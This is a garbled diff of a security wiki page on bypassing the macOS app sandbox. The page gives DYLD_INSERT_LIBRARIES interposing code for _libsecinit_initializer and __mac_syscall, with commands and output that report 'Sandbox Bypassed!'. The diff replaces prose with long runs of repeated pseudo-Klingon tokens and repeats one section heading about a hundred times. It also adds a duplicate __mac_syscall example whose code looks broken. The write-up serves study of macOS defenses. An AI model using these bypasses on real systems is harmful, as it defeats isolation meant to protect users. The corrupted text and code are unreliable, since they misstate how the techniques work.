@@ -82,26 +82,22 @@ If from then sandbox process you are able to **compromise other processes** runn
 ### Shellcodes
 
 Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
-
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-
 ### Entitlements
 
-Note that even if some **actions** might be **allowed by at he sandbox** if an application has an specific **entitlement**, like in:
-
+**ghItlh** vItlhutlh **Sandbox** Daq **jImej** **choHwI'** **entitlement** **'e'** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application** **'e'** **'ej** **vItlhutlh** **'e'** **actions** **'e'** **'ej** **'e'** **allowed** **'e'** **'ej** **vItlhutlh** **'e'** **specific** **'e'** **entitlement** **'e'** **'ej** **vItlhutlh** **'e'** **sandbox** **Daq** **'e'** **'ej** **vItlhutlh** **'e'** **at** **he** **'e'** **'ej** **vItlhutlh** **'e'** **application**
 ```scheme
 (when (entitlement "com.apple.security.network.client")
-      (allow network-outbound (remote ip))
-      (allow mach-lookup
-             (global-name "com.apple.airportd")
-             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
-             (global-name "com.apple.cfnetwork.cfnetworkagent")
-             [...]
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
 ```
-
 ### Interposting Bypass
 
 For more information about **Interposting** check:
@@ -112,6 +108,15 @@ For more information about **Interposting** check:
 
 #### Interpost `_libsecinit_initializer` to prevent the sandbox
 
+### Interposting Bypass
+
+**Interposting** jatlhlaHchaj:
+
+{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% endcontent-ref %}
+
+#### `_libsecinit_initializer` jatlhlaHchaj'e' vItlhutlh jatlhlaHchaj'e' vItlhutlh.
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -120,12 +125,12 @@ For more information about **Interposting** check:
 void _libsecinit_initializer(void);
 
 void overriden__libsecinit_initializer(void) {
-    printf("_libsecinit_initializer called\n");
+printf("_libsecinit_initializer called\n");
 }
 
 __attribute__((used, section("__DATA,__interpose"))) static struct {
-	void (*overriden__libsecinit_initializer)(void);
-	void (*_libsecinit_initializer)(void);
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
 }
 _libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
 ```
@@ -135,10 +140,38 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-
 #### Interpost `__mac_syscall` to prevent the Sandbox
 
 {% code title="interpose.c" %}
+
+#### __mac_syscall-ghItlh
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <dlfcn.h>
+#include <sys/types.h>
+#include <sys/syscall.h>
+
+typedef int (*mac_syscall_t)(int policy, void *args, size_t size);
+
+int __mac_syscall(int policy, void *args, size_t size) {
+    mac_syscall_t original_mac_syscall = (mac_syscall_t)dlsym(RTLD_NEXT, "__mac_syscall");
+    
+    // Bypass the Sandbox
+    if (policy == MAC_POLICY_HANDLE && size == sizeof(int)) {
+        int *syscall_number = (int *)args;
+        if (*syscall_number == SYS_execve) {
+            printf("Sandbox Bypassed!\n");
+            return 0;
+        }
+    }
+    
+    return original_mac_syscall(policy, args, size);
+}
+```
+
+{% endcode %}
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -150,28 +183,27 @@ int __mac_syscall(const char *_policyname, int _call, void *_arg);
 
 // Replacement function
 int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-        printf("Bypassing Sandbox initiation.\n");
-        return 0; // pretend we did the job without actually calling __mac_syscall
-    }
-    // Call the original function for other cases
-    return __mac_syscall(_policyname, _call, _arg);
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
 }
 
 // Interpose Definition
 struct interpose_sym {
-    const void *replacement;
-    const void *original;
+const void *replacement;
+const void *original;
 };
 
 // Interpose __mac_syscall with my_mac_syscall
 __attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
 };
 ```
 {% endcode %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -183,22 +215,660 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
-
 ### Debug & bypass Sandbox with lldb
 
 Let's compile an application that should be sandboxed:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile an application that should be sandboxed:
+
+{% tabs %}
+{% tab title="sand.c" %}### Debug & bypass Sandbox with lldb
+
+Let's compile
 ```c
 #include <stdlib.h>
 int main() {
-    system("cat ~/Desktop/del.txt");
+system("cat ~/Desktop/del.txt");
 }
 ```
-{% endtab %}
-
 {% tab title="entitlements.xml" %}
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>com.apple.security.app-sandbox</key>
+    <true/>
+    <key>com.apple.security.network.client</key>
+    <true/>
+    <key>com.apple.security.files.user-selected.read-write</key>
+    <true/>
+    <key>com.apple.security.files.user-selected.read-only</key>
+    <true/>
+    <key>com.apple.security.files.all</key>
+    <true/>
+    <key>com.apple.security.print</key>
+    <true/>
+    <key>com.apple.security.temporary-exception.apple-events</key>
+    <array>
+        <string>com.apple.dt.Xcode</string>
+    </array>
+</dict>
+</plist>
+```
+
